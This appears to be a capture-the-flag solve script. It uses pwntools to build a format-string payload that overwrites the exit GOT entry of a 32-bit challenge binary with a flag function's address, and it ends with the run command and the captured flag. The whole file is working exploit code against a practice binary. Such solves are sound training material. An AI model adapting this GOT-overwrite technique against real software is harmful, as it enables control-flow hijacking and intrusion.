from pwn import *

flag_adr=0x0804870B
exit_got=0x0804a034

XX=0x870b-8-70 #34493
YY=0x10804-0x870b #33017

payload=p32(exit_got)+p32(exit_got+2)+"%34493x%10$hn"+"%33017x%11$hn"

print payload
#python solve.py|./32_new
#flag{hey_c0ngr4ts_Y0u_pwn3d_1t_y0u_4r3_n0_l0ng3r_a_b4by}
